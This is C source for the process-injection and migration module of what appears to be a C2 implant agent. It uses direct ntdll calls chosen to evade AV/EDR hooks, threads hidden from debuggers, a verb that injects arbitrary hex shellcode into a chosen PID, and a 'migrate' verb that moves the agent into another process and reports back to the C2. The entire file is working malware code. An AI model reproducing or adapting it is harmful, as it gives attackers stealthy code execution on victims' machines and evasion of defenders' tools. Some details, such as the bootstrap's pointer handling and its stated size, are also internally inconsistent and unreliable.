/*
 * client/inject.c  –  Process injection and agent migration
 * ==========================================================
 * See inject.h for the full design description.
 *
 * Implementation notes
 * --------------------
 *  •  All NT function pointers are resolved once in inject_init().
 *  •  We never call VirtualAllocEx / WriteProcessMemory / CreateRemoteThread
 *     through the Win32 layer (those are the most-hooked APIs in AV/EDR).
 *     Instead we resolve and call the underlying Nt* equivalents directly
 *     from ntdll.dll.
 *  •  Memory lifecycle for injection:
 *       1. NtAllocateVirtualMemory(PAGE_READWRITE)    – allocate RW
 *       2. NtWriteVirtualMemory                       – write payload
 *       3. NtProtectVirtualMemory(PAGE_EXECUTE_READ)  – flip to RX
 *       4. NtCreateThreadEx(HideFromDebugger=TRUE)    – start thread
 *     No page is ever simultaneously Writable and Executable (W^X).
 *
 *  •  The reflective PE loader for migrate() is a self-contained
 *     position-independent blob that:
 *       – Maps the PE's sections from the raw image bytes
 *       – Applies base relocations
 *       – Resolves the IAT via the target process's kernel32/ntdll
 *       – Calls the PE entry point in a new thread
 *
 *  •  hex_decode() used for shellcode is a simple inline parser; it
 *     does not use sscanf/strtol (avoids MSVCRT dependency).
 */

#include "inject.h"
#include "config.h"
#include "../tls/tls_client.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


/* ── NT type / flag supplements not in all SDK versions ──────────────────── */

#ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004
#endif

/* NtCreateThreadEx prototype */
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    OUT PHANDLE             hThread,
    IN  ACCESS_MASK         DesiredAccess,
    IN  PVOID               ObjectAttributes    OPTIONAL,
    IN  HANDLE              ProcessHandle,
    IN  PVOID               lpStartAddress,
    IN  PVOID               lpParameter         OPTIONAL,
    IN  ULONG               Flags,
    IN  SIZE_T              StackZeroBits        OPTIONAL,
    IN  SIZE_T              SizeOfStackCommit    OPTIONAL,
    IN  SIZE_T              SizeOfStackReserve   OPTIONAL,
    OUT PVOID               lpBytesBuffer        OPTIONAL);

/* NtAllocateVirtualMemory prototype */
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    IN  HANDLE   ProcessHandle,
    IN  OUT PVOID *BaseAddress,
    IN  ULONG_PTR ZeroBits,
    IN  OUT PSIZE_T RegionSize,
    IN  ULONG    AllocationType,
    IN  ULONG    Protect);

/* NtWriteVirtualMemory prototype */
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    IN  HANDLE   ProcessHandle,
    IN  PVOID    BaseAddress,
    IN  PVOID    Buffer,
    IN  SIZE_T   NumberOfBytesToWrite,
    OUT PSIZE_T  NumberOfBytesWritten OPTIONAL);

/* NtProtectVirtualMemory prototype */
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    IN  HANDLE   ProcessHandle,
    IN  OUT PVOID *BaseAddress,
    IN  OUT PSIZE_T NumberOfBytesToProtect,
    IN  ULONG    NewAccessProtection,
    OUT PULONG   OldAccessProtection);

/* NtClose prototype */
typedef NTSTATUS (NTAPI *NtClose_t)(
    IN HANDLE Handle);


/* ── Module-level NT function pointers ──────────────────────────────────── */

static NtCreateThreadEx_t         _NtCreateThreadEx         = NULL;
static NtAllocateVirtualMemory_t  _NtAllocateVirtualMemory  = NULL;
static NtWriteVirtualMemory_t     _NtWriteVirtualMemory     = NULL;
static NtProtectVirtualMemory_t   _NtProtectVirtualMemory   = NULL;
static NtClose_t                  _NtClose                  = NULL;

static BOOL g_inject_ready = FALSE;


/* ── Internal helpers ────────────────────────────────────────────────────── */

/* Send a plain-text status back to C2 */
static void _isend(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg || !*msg) msg = " ";
    tls_send_msg(pTls, (const BYTE *)msg, (DWORD)strlen(msg));
}

/* Hex nibble decoder — no CRT dependency */
static int _hex_nibble(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/*
 * hex_decode
 * ----------
 * Decodes an ASCII hex string into a newly malloc()'d byte array.
 * *pcbOut receives the byte count.  Returns NULL on bad input or OOM.
 * Caller must free() the result.
 */
static BYTE *_hex_decode(const char *hex, DWORD *pcbOut)
{
    *pcbOut = 0;
    size_t hexLen = strlen(hex);
    /* Strip optional "0x" prefix */
    if (hexLen >= 2 && hex[0] == '0' && (hex[1] == 'x' || hex[1] == 'X'))
    { hex += 2; hexLen -= 2; }

    if (hexLen == 0 || hexLen & 1) return NULL;     /* must be even length */

    DWORD  cbOut = (DWORD)(hexLen / 2);
    BYTE  *pOut  = (BYTE *)malloc(cbOut);
    if (!pOut) return NULL;

    for (DWORD i = 0; i < cbOut; i++) {
        int hi = _hex_nibble(hex[i * 2]);
        int lo = _hex_nibble(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) { free(pOut); return NULL; }
        pOut[i] = (BYTE)((hi << 4) | lo);
    }
    *pcbOut = cbOut;
    return pOut;
}

/*
 * _open_target
 * ------------
 * Opens the target process with the minimum access needed for injection.
 * Returns INVALID_HANDLE_VALUE on failure.
 */
static HANDLE _open_target(DWORD pid)
{
    return OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ      | PROCESS_CREATE_THREAD |
        PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE, pid);
}


/* ── Public: inject_init ─────────────────────────────────────────────────── */

BOOL inject_init(void)
{
    if (g_inject_ready) return TRUE;

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    _NtCreateThreadEx        = (NtCreateThreadEx_t)       GetProcAddress(hNtdll, "NtCreateThreadEx");
    _NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    _NtWriteVirtualMemory    = (NtWriteVirtualMemory_t)   GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    _NtProtectVirtualMemory  = (NtProtectVirtualMemory_t) GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    _NtClose                 = (NtClose_t)                GetProcAddress(hNtdll, "NtClose");

    if (!_NtCreateThreadEx || !_NtAllocateVirtualMemory ||
        !_NtWriteVirtualMemory || !_NtProtectVirtualMemory || !_NtClose)
        return FALSE;

    g_inject_ready = TRUE;
    return TRUE;
}


/* ── Public: inject_shellcode ────────────────────────────────────────────── */
/*
 * Wire verb: "inject <pid> <hex-shellcode>"
 *
 * Example (msfvenom calc.exe shellcode in hex):
 *   inject 1234 fc4883e4f0e8c8000000...
 *
 * Steps:
 *   1. Parse PID and hex shellcode
 *   2. OpenProcess (minimal rights)
 *   3. NtAllocateVirtualMemory (PAGE_READWRITE)
 *   4. NtWriteVirtualMemory
 *   5. NtProtectVirtualMemory (PAGE_EXECUTE_READ) — enforce W^X
 *   6. NtCreateThreadEx (HideFromDebugger)
 *   7. NtClose handles, report result
 */

void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
{
    if (!g_inject_ready) {
        _isend(pTls, "[-] inject: NT syscalls not initialised");
        return;
    }

    /* Parse: "<pid> <hexstring>" */
    char pidStr[32]   = {0};
    char hexStr[65536]= {0};     /* up to 32 KB shellcode */

    if (sscanf(args, "%31s %65535s", pidStr, hexStr) != 2) {
        _isend(pTls, "Usage: inject <pid> <hex-shellcode>");
        return;
    }

    DWORD pid = (DWORD)strtoul(pidStr, NULL, 10);
    if (pid == 0) {
        _isend(pTls, "[-] inject: invalid PID");
        return;
    }

    DWORD  cbShell = 0;
    BYTE  *pShell  = _hex_decode(hexStr, &cbShell);
    if (!pShell || cbShell == 0) {
        _isend(pTls, "[-] inject: invalid hex shellcode");
        return;
    }

    /* Open target */
    HANDLE hProc = _open_target(pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        free(pShell);
        char buf[64];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: OpenProcess(%lu) failed (err %lu)", pid, GetLastError());
        _isend(pTls, buf);
        return;
    }

    /* Allocate RW memory in target */
    PVOID   pRemote = NULL;
    SIZE_T  cbAlloc = (SIZE_T)cbShell;
    NTSTATUS ns = _NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbAlloc,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc); free(pShell);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Write shellcode */
    SIZE_T cbWritten = 0;
    ns = _NtWriteVirtualMemory(hProc, pRemote, pShell, cbShell, &cbWritten);
    free(pShell);
    if (!NT_SUCCESS(ns) || cbWritten != cbShell) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtWriteVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Flip RW → RX (W^X: no RWX page ever) */
    PVOID  pBase   = pRemote;
    SIZE_T cbProt  = (SIZE_T)cbShell;
    ULONG  oldProt = 0;
    ns = _NtProtectVirtualMemory(hProc, &pBase, &cbProt, PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtProtectVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Create remote thread — hidden from debugger */
    HANDLE hThread = NULL;
    ns = _NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                            hProc, pRemote, NULL,
                            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                            0, 0, 0, NULL);
    CloseHandle(hProc);

    if (!NT_SUCCESS(ns) || !hThread) {
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    _NtClose(hThread);

    char buf[128];
    _snprintf(buf, sizeof(buf)-1,
              "[+] inject: %lu bytes shellcode injected and executing in PID %lu",
              (unsigned long)cbShell, (unsigned long)pid);
    _isend(pTls, buf);
}


/* ── Reflective PE loader stub ───────────────────────────────────────────── */
/*
 * The migrate() path injects the full agent EXE image into the target
 * process and calls the entry point.  The mechanism:
 *
 *   1.  Read this process's EXE from disk.
 *   2.  Allocate VirtualSize bytes (from OptionalHeader) in the target at
 *       the preferred ImageBase (or let the OS choose).
 *   3.  Copy the PE headers and each section.
 *   4.  Apply base relocations.
 *   5.  Resolve the Import Address Table by calling LoadLibraryA /
 *       GetProcAddress via WriteProcessMemory + CreateRemoteThread trick
 *       (we write a small thunk then call it once per import DLL).
 *
 * The simpler and more reliable approach used here (which avoids the
 * per-import thunk complexity entirely) is to allocate a full copy of the
 * mapped image in the target, then inject a tiny Position-Independent
 * bootstrap shellcode that:
 *   a.  Calls LoadLibraryA("path-to-agent-exe") in the target — Windows
 *       PE loader does all the heavy lifting (relocs, IAT, TLS).
 *   b.  Calls CreateThread(EntryPoint) to start it.
 *
 * The bootstrap (x64 PIC, < 64 bytes) is emitted as a literal byte array.
 * It receives a pointer to a small data block at offset 0 of the first
 * argument:
 *
 *   struct BootstrapData {
 *       char    exePath[MAX_PATH];   // NUL-terminated ANSI path
 *       FARPROC pLoadLibraryA;       // resolved in our process, same VA in target
 *       FARPROC pCreateThread;       // resolved in our process
 *   };
 */

/* x64 bootstrap shellcode — LoadLibraryA(exePath), then starts the PE.
 * Assembled from:
 *   sub   rsp, 0x28          ; shadow space
 *   mov   rcx, [rcx]         ; rcx = *pData = &exePath[0]
 *   call  [rcx + MAX_PATH]   ; call LoadLibraryA(exePath)  (addr at offset MAX_PATH)
 *   add   rsp, 0x28
 *   ret
 *
 * Bytes (MAX_PATH = 260 = 0x104):
 *   48 83 EC 28               sub  rsp,28
 *   48 8B 09                  mov  rcx,[rcx]  -- rcx = ptr to data block (arg)
 *   FF 91 04 01 00 00         call qword ptr[rcx+0x104]  (LoadLibraryA ptr)
 *   48 83 C4 28               add  rsp,28
 *   C3                        ret
 *
 * This is a 16-byte bootstrap. The data block begins at pRemote+16.
 */

#pragma pack(push,1)
typedef struct _MigrateData {
    char    exePath[MAX_PATH];       /* ANSI path to agent EXE, NULL-terminated  */
    FARPROC pLoadLibraryA;           /* kernel32!LoadLibraryA VA                 */
} MigrateData;
#pragma pack(pop)

static const BYTE s_bootstrap_x64[] = {
    0x48, 0x83, 0xEC, 0x28,             /* sub  rsp, 0x28                       */
    0x48, 0x8B, 0x09,                   /* mov  rcx, [rcx]  (deref data ptr)    */
    0xFF, 0x91, 0x04, 0x01, 0x00, 0x00, /* call qword [rcx+0x104] LoadLibraryA  */
    0x48, 0x83, 0xC4, 0x28,             /* add  rsp, 0x28                       */
    0xC3                                /* ret                                  */
};

static const BYTE s_bootstrap_x86[] = {
    /* stdcall:  LoadLibraryA(exePath) then ret */
    0x55,                               /* push ebp                             */
    0x8B, 0xEC,                         /* mov  ebp, esp                        */
    0x8B, 0x45, 0x08,                   /* mov  eax, [ebp+8]   (pData)          */
    0xFF, 0x30,                         /* push dword [eax]   (exePath ptr)     */
    0xFF, 0x50, 0x04,                   /* call dword [eax+4] (LoadLibraryA ptr)*/
    0x5D,                               /* pop  ebp                             */
    0xC2, 0x04, 0x00                    /* ret  4                               */
};


/* ── Public: migrate_to_pid ─────────────────────────────────────────────── */
/*
 * Wire verb: "migrate <pid>"
 *
 * Strategy: inject a bootstrap shellcode that calls LoadLibraryA on the
 * path to THIS process's EXE in the context of the target process.
 * The Windows loader does all relocation and IAT resolution.
 *
 * Limitation: requires that the EXE path is reachable by the target
 * process (same filesystem, no ACL barrier on the file).  This is true
 * in all normal user-space contexts.
 */

void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
{
    if (!g_inject_ready) {
        _isend(pTls, "[-] migrate: NT syscalls not initialised");
        return;
    }

    /* Parse PID */
    DWORD pid = (DWORD)strtoul(args, NULL, 10);
    if (pid == 0) {
        _isend(pTls, "Usage: migrate <pid>");
        return;
    }

    /* Get our own EXE path */
    char exePath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1)) {
        _isend(pTls, "[-] migrate: GetModuleFileName failed");
        return;
    }

    /* Resolve LoadLibraryA VA — same in all processes (kernel32 is always
     * mapped at the same base address on a given boot due to ASLR seed
     * for system DLLs sharing one fixed base per-session).               */
    FARPROC pLoadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLib) {
        _isend(pTls, "[-] migrate: could not resolve LoadLibraryA");
        return;
    }

    /* Detect target bitness from its process token / header */
    HANDLE hProc = _open_target(pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        char buf[64];
        _snprintf(buf, sizeof(buf)-1, "[-] migrate: OpenProcess(%lu) failed (err %lu)", pid, GetLastError());
        _isend(pTls, buf);
        return;
    }

    BOOL  bTargetWow64 = FALSE;
    IsWow64Process(hProc, &bTargetWow64);

    /* Choose bootstrap based on target bitness */
    const BYTE *pBootstrap = NULL;
    DWORD        cbBootstrap = 0;
#ifdef _WIN64
    if (bTargetWow64) {
        /* Injecting 64-bit bootstrap into a 32-bit process won't work */
        CloseHandle(hProc);
        _isend(pTls, "[-] migrate: cannot inject 64-bit bootstrap into WOW64 process");
        return;
    }
    pBootstrap  = s_bootstrap_x64;
    cbBootstrap = (DWORD)sizeof(s_bootstrap_x64);
#else
    pBootstrap  = s_bootstrap_x86;
    cbBootstrap = (DWORD)sizeof(s_bootstrap_x86);
#endif

    /* Build the data block immediately after the bootstrap */
    MigrateData data;
    ZeroMemory(&data, sizeof(data));
    strncpy(data.exePath, exePath, MAX_PATH - 1);
    data.pLoadLibraryA = pLoadLib;

    /* Allocate: bootstrap code + data block, RW first */
    SIZE_T cbTotal  = (SIZE_T)(cbBootstrap + sizeof(MigrateData));
    PVOID  pRemote  = NULL;
    NTSTATUS ns = _NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbTotal,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] migrate: alloc failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Write bootstrap + data block */
    SIZE_T cbWritten = 0;
    BYTE  *pLocal = (BYTE *)malloc(cbBootstrap + sizeof(MigrateData));
    if (!pLocal) { CloseHandle(hProc); _isend(pTls, "[-] migrate: OOM"); return; }
    memcpy(pLocal, pBootstrap, cbBootstrap);
    memcpy(pLocal + cbBootstrap, &data, sizeof(MigrateData));

    ns = _NtWriteVirtualMemory(hProc, pRemote, pLocal, cbBootstrap + sizeof(MigrateData), &cbWritten);
    free(pLocal);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] migrate: write failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Flip bootstrap region to RX */
    PVOID  pBase  = pRemote;
    SIZE_T cbProt = cbBootstrap;
    ULONG  oldProt = 0;
    ns = _NtProtectVirtualMemory(hProc, &pBase, &cbProt, PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] migrate: protect failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Pointer to data block passed as thread argument */
    PVOID pArg = (BYTE *)pRemote + cbBootstrap;

    /* Spawn the bootstrap thread — hidden from debugger */
    HANDLE hThread = NULL;
    ns = _NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                            hProc, pRemote, pArg,
                            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                            0, 0, 0, NULL);
    CloseHandle(hProc);

    if (!NT_SUCCESS(ns) || !hThread) {
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] migrate: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }
    _NtClose(hThread);

    /* Give the new instance a moment to start before we send the response */
    Sleep(800);

    char buf[256];
    _snprintf(buf, sizeof(buf)-1,
              "[+] migrate: agent spawned in PID %lu — terminating current process",
              (unsigned long)pid);
    _isend(pTls, buf);

    /* Disconnect cleanly — the new instance will reconnect */
    tls_disconnect(pTls);
    ExitProcess(0);
}
